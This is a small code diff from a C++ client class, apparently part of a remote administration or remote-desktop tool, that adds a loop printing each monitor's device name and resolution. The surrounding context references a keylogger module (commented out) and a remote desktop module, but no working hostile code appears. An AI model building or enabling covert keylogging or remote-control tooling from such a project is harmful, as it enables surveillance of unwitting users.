@@ -156,6 +156,9 @@ Cliente::Cliente() {
     //this->mod_Key = new mod_Keylogger();
     //this->mod_Key->Start();
     this->mod_RemoteDesk = new mod_RemoteDesktop(this->hUser23DLL);
+    for (auto mon : this->mod_RemoteDesk->m_ListaMonitores()) {
+        std::cout << mon.szDevice << "\t" << mon.rectData.resWidth << "x" << mon.rectData.resHeight << "\n";
+    }
 
 }
 
